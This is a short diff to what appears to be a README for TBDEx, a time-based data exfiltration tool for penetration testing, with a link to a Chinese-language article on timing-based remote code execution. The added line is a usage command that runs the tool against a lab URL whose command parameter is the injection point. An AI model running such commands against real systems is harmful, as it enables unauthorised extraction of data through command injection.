@@ -1,4 +1,5 @@
 //渗透测试中利用基于时间差反馈的远程代码执行漏洞（Timed Based RCE）进行数据获取 http://www.freebuf.com/articles/web/129045.html
+python timbesed.py -url http://192.168.207.128/ml.php?c=%here% -payload_limit 48 -tmp
 #&nbsp;TBDEx
 Time Based Data Exfiltration Tool<br />
 
